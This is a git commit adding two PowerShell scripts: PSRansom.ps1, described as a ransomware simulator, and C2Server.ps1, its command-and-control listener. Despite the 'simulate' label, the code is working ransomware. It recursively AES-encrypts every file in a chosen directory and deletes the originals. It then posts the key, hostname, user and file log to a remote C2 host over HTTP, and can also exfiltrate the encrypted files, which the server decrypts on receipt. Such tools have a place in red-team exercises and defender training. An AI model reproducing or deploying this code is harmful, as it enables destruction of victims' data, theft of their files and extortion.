1ea9a02474d272b19790091b201dd89da1c080c2
Joel GM <34335312+JoelGMSec@users.noreply.github.com>
2022-02-27 12:54:59 +0100

    Add files via upload

---
+++ C2Server.ps1
@@ -0,0 +1,191 @@
+#================================#
+#     C2Server by @JoelGMSec     #
+#      https://darkbyte.net      #
+#================================#
+
+# Design
+$ProgressPreference = "SilentlyContinue"
+$ErrorActionPreference = "SilentlyContinue"
+$OSVersion = [Environment]::OSVersion.Platform
+if ($OSVersion -like "*Win*") {
+$Host.UI.RawUI.WindowTitle = "C2Server - by @JoelGMSec" 
+$Host.UI.RawUI.BackgroundColor = "Black"
+$Host.UI.RawUI.ForegroundColor = "White" }
+
+# Http Server
+$whost = $args[0]
+$wport = $args[1]
+$http = [System.Net.HttpListener]::new() 
+$http.Prefixes.Add("http://$whost`:$wport/")
+$http.Start()
+
+# Banner
+function Show-Banner {
+   Write-Host 
+   Write-Host "   ____ ____  ____                            " -ForegroundColor Blue
+   Write-Host "  / ___|___ \/ ___|  ___ _ ____   _____ _ __  " -ForegroundColor Blue
+   Write-Host " | |     __) \___ \ / _ \ '__\ \ / / _ \ '__| " -ForegroundColor Blue
+   Write-Host " | |___ / __/ ___) |  __/ |   \ V /  __/ |    " -ForegroundColor Blue
+   Write-Host "  \____|_____|____/ \___|_|    \_/ \___|_|    " -ForegroundColor Blue
+   Write-Host                                                
+   Write-Host "  -------------- by @JoelGMSec -------------  " -ForegroundColor Green }
+
+# Help
+function Show-Help {
+   Write-host ; Write-Host " Info: " -ForegroundColor Yellow -NoNewLine ; Write-Host " This tool helps you to recieve data from"
+   Write-Host "        PSRansom client through HTTP protocol"
+   Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\C2Server.ps1 LocalHost LocalPort" -ForegroundColor Blue 
+   Write-Host "          Example: .\C2Server localhost 443" -ForegroundColor Green
+   Write-Host "          Use * to listen on all interfaces on Windows host" -ForegroundColor Green
+   Write-Host "          Use + to listen on all interfaces on Linux host" -ForegroundColor Green
+   Write-Host ; Write-Host " Warning: " -ForegroundColor Red -NoNewLine  ; Write-Host "All data will be sent to the C2Server without any encryption"
+   Write-Host "         " -NoNewLine ; Write-Host " You need previously generated recovery key to retrieve files" ; Write-Host }
+
+# Errors
+if ($args[0] -like "-h*") { Show-Banner ; Show-Help ; break }
+if ($args[0] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
+if ($args[1] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
+
+# Functions
+function Invoke-AESEncryption {
+   [CmdletBinding()]
+   [OutputType([string])]
+   Param(
+       [Parameter(Mandatory = $true)]
+       [ValidateSet("Encrypt", "Decrypt")]
+       [String]$Mode,
+
+       [Parameter(Mandatory = $true)]
+       [String]$Key,
+
+       [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+       [String]$Text,
+
+       [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+       [String]$Path)
+
+   Begin {
+      $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+      $aesManaged = New-Object System.Security.Cryptography.AesManaged
+      $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+      $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+      $aesManaged.BlockSize = 128
+      $aesManaged.KeySize = 256 }
+
+   Process {
+      $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+      switch ($Mode) {
+
+         "Encrypt" {
+             if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+
+             if ($Path) {
+                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                if (!$File.FullName) { break }
+                $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                $outPath = $File.FullName + ".psr" }
+
+             $encryptor = $aesManaged.CreateEncryptor()
+             $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+             $encryptedBytes = $aesManaged.IV + $encryptedBytes
+             $aesManaged.Dispose()
+
+             if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+             if ($Path) {
+                [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}
+
+         "Decrypt" {
+             if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+
+             if ($Path) {
+                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                if (!$File.FullName) { break }
+                $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                $outPath = $File.FullName.replace(".psr","") }
+
+             $aesManaged.IV = $cipherBytes[0..15]
+             $decryptor = $aesManaged.CreateDecryptor()
+             $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+             $aesManaged.Dispose()
+
+             if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+             if ($Path) {
+                [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}}}
+
+  End {
+      $shaManaged.Dispose()
+      $aesManaged.Dispose()}}
+
+function R64Decoder {
+   $base64 = $args[1].ToCharArray() ; [array]::Reverse($base64) ; $base64 = -join $base64
+   $base64 = [string]$base64.Replace("-", "+") ; $base64 = [string]$base64.Replace("_", "/")
+   switch ($base64.Length % 4) { 0 { break } ; 2 { $base64 += "=="; break } ; 3 { $base64 += "="; break }}
+   if ($args[0] -eq "-t") { $revb64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) ; $revb64 }
+   if ($args[0] -eq "-f") { $revb64 = [System.Convert]::FromBase64String($base64) ; return $revb64 }}
+
+# Main
+Show-Banner ; Write-Host
+if (($whost -eq "*") -or ($whost -eq "+")) { $whost = "0.0.0.0" }
+Write-Host "[+] Listening to new connection on $whost`:$wport" -f Blue
+while ($http.IsListening) { $context = $http.GetContext()
+   
+if ($context.Request.HttpMethod -eq "GET") {
+   if ($context.Request.RawUrl -eq "/status") { 
+      Write-Host "[!] New connection from $($context.Request.RemoteEndPoint)" -f Red }
+   
+   if ($context.Request.RawUrl -eq"/files") { mkdir "C2Files" 2>&1> $null 
+      Write-Host ; Write-Host "[i] Recieving exfiltrated files and decrypting.." -f Green ; sleep 2 }   
+
+   if ($context.Request.RawUrl -eq "/done") { Write-Host ; Write-Host "[i] Done!" -f Green ; Write-Host ; $http.Stop() }
+   
+   if ($context.Request.RawUrl -eq "/robots.txt") { if ($context.Request.UserAgent -like "*PowerShell*") {
+      [string]$html = Get-Content .\robots.txt }}
+   
+   else { [string]$html = "<h1>It Works!</h1><p>This is the default web page for this server</p>" }
+   
+   $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
+   $context.Response.ContentLength64 = $buffer.Length
+   $context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
+   $context.Response.OutputStream.Close() }
+
+if ($context.Request.HttpMethod -eq "POST") {
+   $FormContent = [System.IO.StreamReader]::new($context.Request.InputStream).ReadToEnd() 
+
+   if ($context.Request.RawUrl -eq "/data") { 
+      $B64Data = R64Decoder -t $FormContent ; $Data = $B64Data.ToString().Replace("[","`n[").split(":",5).split("`n",5)
+      Write-Host ; Write-Host $Data[3] -f Yellow -NoNewLine ; Write-Host ":" -f Yellow -NoNewLine ; Write-Host $Data[4] 
+      Write-Host $Data[5] -f Yellow -NoNewLine ; Write-Host ":" -f Yellow -NoNewLine ; Write-Host $Data[6] 
+      Write-Host $Data[7] -f Yellow -NoNewLine ; Write-Host ":" -f Yellow -NoNewLine ; Write-Host $Data[8] 
+      $computer = $Data[4] ; $time = $Data[8] 
+
+      Write-Host ; Write-Host "[i] Getting recovery key.." -f Green ; $RAWKey = $Data[2].replace(" ","")   
+      $TMKey = $time.replace(":","").replace(" ","").replace("-","").replace("/","")+$computer
+      $DESKey = R64Decoder -t $RAWKey ; $TMKey = $TMKey.replace(" ","")
+      $B64Key = Invoke-AESEncryption -Mode Decrypt -Key $TMKey -Text $DESKey ; Write-Host $B64Key }
+
+   if ($context.Request.RawUrl -like "/files/*") { 
+      $Rfile = $($context.Request.RawUrl).split("/")[-1] ; $B64Name = R64Decoder -t $Rfile 
+      if ($B64Name -eq "none.null") { Write-Host "[!] No files have been recieved!" -f Red } else { 
+        
+      if ($OSVersion -like "*Win*") { $C2Rfile = "$pwd\C2Files\$B64Name" } else { $C2Rfile = "$pwd/C2Files/$B64Name" } 
+         $C2RName = $C2Rfile.replace(".psr","") ; Write-Host "[+] $C2RName file recieved" -f Blue ; $B64file = R64Decoder -f $FormContent
+
+      if (-not (Test-Path $C2Rfile)) { if ((Get-Host).Version.Major -gt 5) {
+         Add-Content -Path $C2Rfile -Value $B64file -AsByteStream } else { 
+         Add-Content -Path $C2Rfile -Value $B64file -Encoding Byte  }
+         Invoke-AESEncryption -Mode Decrypt -Key $B64Key -Path $C2Rfile 
+         foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object {
+            ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { Remove-Item $i }}}}
+
+   if ($context.Request.RawUrl -eq "/logs") { 
+      Write-Host ; Write-Host "[i] Getting encrypted files list.." -f Green -NoNewLine
+      $B64Logs = R64Decoder -t $FormContent ; sleep 2
+      $Logs = $B64Logs.ToString().Replace("[","`n[") ; Write-Host $Logs -f Red }
+
+   [string]$html = "<h1>It Works!</h1><p>This is the default web page for this server</p>" 
+   $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
+   $context.Response.ContentLength64 = $buffer.Length
+   $context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
+   $context.Response.OutputStream.Close()}}
---
+++ PSRansom.ps1
@@ -0,0 +1,210 @@
+﻿#================================#
+#     PSRansom by @JoelGMSec     #
+#      https://darkbyte.net      #
+#================================#
+
+# Design
+$ProgressPreference = "SilentlyContinue"
+$ErrorActionPreference = "SilentlyContinue"
+$OSVersion = [Environment]::OSVersion.Platform
+if ($OSVersion -like "*Win*") {
+$Host.UI.RawUI.WindowTitle = "PSRansom - by @JoelGMSec" 
+$Host.UI.RawUI.BackgroundColor = "Black"
+$Host.UI.RawUI.ForegroundColor = "White" }
+
+# Banner
+function Show-Banner {
+   Write-Host 
+   Write-Host "  ____  ____  ____                                  " -ForegroundColor Blue
+   Write-Host " |  _ \/ ___||  _ \ __ _ _ __  ___  ___  _ __ ___   " -ForegroundColor Blue
+   Write-Host " | |_) \___ \| |_) / _' | '_ \/ __|/ _ \| '_ ' _ \  " -ForegroundColor Blue
+   Write-Host " |  __/ ___) |  _ < (_| | | | \__ \ (_) | | | | | | " -ForegroundColor Blue
+   Write-Host " |_|   |____/|_| \_\__,_|_| |_|___/\___/|_| |_| |_| " -ForegroundColor Blue
+   Write-Host                                                            
+   Write-Host "  ----------------- by @JoelGMSec ----------------  " -ForegroundColor Green }
+
+# Help
+function Show-Help {
+   Write-host ; Write-Host " Info: " -ForegroundColor Yellow -NoNewLine ; Write-Host " This tool helps you simulate encryption process of a"
+   Write-Host "        generic ransomware in PowerShell with C2 capabilities"
+   Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\RansomShell.ps1 -e Directory -s C2Server -p C2Port" -ForegroundColor Blue 
+   Write-Host "          Encrypt all files & sends recovery key to C2Server" -ForegroundColor Green
+   Write-Host "          Use -x to exfiltrate and decrypt files on C2Server" -ForegroundColor Green
+   Write-Host ; Write-Host "        .\RansomShell.ps1 -d Directory -k RecoveryKey" -ForegroundColor Blue 
+   Write-Host "          Decrypt all files with recovery key string" -ForegroundColor Green
+   Write-Host ; Write-Host " Warning: " -ForegroundColor Red -NoNewLine  ; Write-Host "All info will be sent to the C2Server without any encryption"
+   Write-Host "         " -NoNewLine ; Write-Host " You need previously generated recovery key to retrieve files" ; Write-Host }
+
+# Variables
+$Mode = $args[0]
+$Directory = $args[1]
+$PSRKey = $args[3]
+$C2Server = $args[3]
+$C2Port = $args[5]
+$Exfil = $args[6]
+$C2Status = $null
+
+# Errors
+if ($args[0] -like "-h*") { Show-Banner ; Show-Help ; break }
+if ($args[0] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
+if ($args[1] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
+if ($args[2] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
+if ($args[3] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
+
+# Proxy Aware
+[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
+[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+$AllProtocols = [System.Net.SecurityProtocolType]"Ssl3,Tls,Tls11,Tls12" ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
+
+# Functions
+$computer = ([Environment]::MachineName).ToLower() ; $user = ([Environment]::UserName).ToLower()
+$Time = Get-Date -Format "HH:mm - dd/MM/yy" ; $TMKey = $time.replace(":","").replace(" ","").replace("-","").replace("/","")+$computer
+if ($OSVersion -like "*Win*") { $domain = (([Environment]::UserDomainName).ToLower()+"\") ; $slash = "\" } else { $domain = $null ; $slash = "/" } 
+$DirectoryTarget = $Directory.Split($slash)[-1] ; if (!$DirectoryTarget) { $DirectoryTarget = $Directory.Path.Split($slash)[-1] }
+
+function Invoke-AESEncryption {
+   [CmdletBinding()]
+   [OutputType([string])]
+   Param(
+       [Parameter(Mandatory = $true)]
+       [ValidateSet("Encrypt", "Decrypt")]
+       [String]$Mode,
+
+       [Parameter(Mandatory = $true)]
+       [String]$Key,
+
+       [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+       [String]$Text,
+
+       [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+       [String]$Path)
+
+   Begin {
+      $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+      $aesManaged = New-Object System.Security.Cryptography.AesManaged
+      $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+      $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+      $aesManaged.BlockSize = 128
+      $aesManaged.KeySize = 256 }
+
+   Process {
+      $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+      switch ($Mode) {
+
+         "Encrypt" {
+             if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+
+             if ($Path) {
+                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                if (!$File.FullName) { break }
+                $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                $outPath = $File.FullName + ".psr" }
+
+             $encryptor = $aesManaged.CreateEncryptor()
+             $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+             $encryptedBytes = $aesManaged.IV + $encryptedBytes
+             $aesManaged.Dispose()
+
+             if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+             if ($Path) {
+                [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}
+
+         "Decrypt" {
+             if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+
+             if ($Path) {
+                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                if (!$File.FullName) { break }
+                $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                $outPath = $File.FullName.replace(".psr","") }
+
+             $aesManaged.IV = $cipherBytes[0..15]
+             $decryptor = $aesManaged.CreateDecryptor()
+             $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+             $aesManaged.Dispose()
+
+             if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+             if ($Path) {
+                [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}}}
+
+  End {
+      $shaManaged.Dispose()
+      $aesManaged.Dispose()}}
+
+function R64Encoder { 
+   if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
+   if ($args[0] -eq "-f") { $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
+   $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "–") ; $base64 = $base64.Replace("/", "_")
+   $revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 ; return $R64Base }
+
+function ShowInfo {
+   Write-Host ; Write-Host "[+] Hostname: " -NoNewLine -ForegroundColor Yellow ; Write-Host $computer
+   Write-Host "[+] Current User: " -NoNewLine -ForegroundColor Yellow ; Write-Host $domain$user
+   Write-Host "[+] Current Time: " -NoNewLine -ForegroundColor Yellow ; Write-Host $time }
+
+function GetStatus {
+   Try { Invoke-WebRequest -useb "http://$C2Server`:$C2Port/status" -Method GET 
+      Write-Host "[i] Command & Control Server is up!" -ForegroundColor Green }
+   Catch { Write-Host "[!] Command & Control Server is down!" -ForegroundColor Red }}
+
+function SendResults {
+   $DESKey = Invoke-AESEncryption -Mode Encrypt -Key $TMKey -Text $PSRKey ; $B64Key = R64Encoder -t $DESKey
+   $C2Data = " [+] Key: $B64Key [+] Hostname: $computer [+] Current User: $domain$user [+] Current Time: $time"
+   $RansomLogs = Get-Content log.txt ; if (!$RansomLogs) { $RansomLogs = "[!] No files have been encrypted!" }
+   $B64Data = R64Encoder -t $C2Data ; $B64Logs = R64Encoder -t $RansomLogs
+   Invoke-WebRequest -useb "http://$C2Server`:$C2Port/data" -Method POST -Body $B64Data 2>&1> $null
+   Invoke-WebRequest -useb "http://$C2Server`:$C2Port/logs" -Method POST -Body $B64Logs 2>&1> $null }
+
+function SendOK {
+   Invoke-WebRequest -useb "http://$C2Server`:$C2Port/done" -Method GET 2>&1> $null }
+
+function EncryptFiles {
+   foreach ($i in $(Get-ChildItem $Directory -recurse -exclude *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
+      Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i ; Add-Content -Path log.txt -Value "[!] $i is now encrypted" ; Remove-Item $i }}
+
+function ExfiltrateFiles {
+   Invoke-WebRequest -useb "http://$C2Server`:$C2Port/files" -Method GET 2>&1> $null 
+   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
+      $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile
+      Invoke-WebRequest -useb "http://$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }
+   if (!$i){ $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "http://$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
+
+function DecryptFiles {
+   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
+      Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i ; $rfile = $i.replace(".psr","")
+      Write-Host "[+] $rfile is now decrypted" -ForegroundColor Blue ; Remove-Item key.txt }}
+
+function CheckFiles { 
+   $RFiles = Get-ChildItem $Directory -recurse -filter *.psr ; if ($RFiles) { $RFiles | Remove-Item } else {
+   Write-Host "[!] No encrypted files has been found!" -ForegroundColor Red }}
+
+# Main
+Show-Banner ; ShowInfo
+
+if ($Mode -eq "-d") { 
+   Write-Host ; Write-Host "[!] Recovering ransomware infection on $DirectoryTarget directory.." -ForegroundColor Red
+   Write-Host "[i] Applying recovery key on encrypted files.." -ForegroundColor Green
+   DecryptFiles ; CheckFiles ; sleep 1 }
+ 
+else {
+   Write-Host ; Write-Host "[!] Simulating ransomware infection on $DirectoryTarget directory.." -ForegroundColor Red
+   Write-Host "[+] Checking communication with Command & Control Server.." -ForegroundColor Blue
+   $C2Status = GetStatus ; Remove-Item log.txt ; sleep 1
+
+   Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
+   $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})
+
+   Write-Host "[!] Encrypting all files with 256 bits AES key.." -ForegroundColor Red
+   EncryptFiles ; if ($C2Status) { SendResults ; sleep 1
+
+   if ($Exfil -eq "-x") { Write-Host "[i] Exfiltrating files to Command & Control Server.." -ForegroundColor Green
+      ExfiltrateFiles ; sleep 1 }}
+
+   if (!$C2Status) { Write-Host "[+] Saving key and logs to current folder.." -ForegroundColor Blue 
+      $RansomLogs = Get-Content log.txt ; if (!$RansomLogs) { Add-Content -Path log.txt -Value "[!] No files have been encrypted!" }
+      Add-Content -Path key.txt -Value $PSRKey }
+   else { Write-Host "[+] Sending key and logs to Command & Control Server.." -ForegroundColor Blue ; SendOK ; Remove-Item log.txt }}
+
+sleep 1 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host
